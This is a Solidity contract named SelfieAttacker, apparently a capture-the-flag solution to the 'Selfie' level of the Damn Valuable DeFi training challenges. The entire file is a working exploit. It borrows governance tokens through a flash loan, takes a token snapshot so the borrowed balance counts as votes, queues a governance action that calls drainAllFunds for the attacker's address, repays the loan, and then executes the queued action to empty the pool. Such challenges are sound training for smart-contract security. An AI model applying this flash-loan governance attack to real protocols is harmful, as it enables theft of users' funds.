pragma solidity ^0.6.0;


import "../../selfie/SelfiePool.sol";
import "../../selfie/SimpleGovernance.sol";
import "../../DamnValuableTokenSnapshot.sol";


contract SelfieAttacker {
    
    address owner;
    SimpleGovernance governanceContract;
    SelfiePool selfieContract;
    uint256 actionToExecute;

    constructor(SimpleGovernance _governanceContract, SelfiePool _selfieContract) public {
        owner = msg.sender;
        governanceContract = _governanceContract;
        selfieContract =  _selfieContract;
    }


    function receiveTokens(DamnValuableTokenSnapshot _token, uint256 _amount) external {
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner); 
        _token.snapshot();
        actionToExecute = governanceContract.queueAction(address(selfieContract), data, 0);
        _token.transfer(msg.sender, _amount);
    }

    function attack(uint256 _amount) public {
        selfieContract.flashLoan(_amount);
    }

    function executeAction() public {
        governanceContract.executeAction(actionToExecute);
    }
}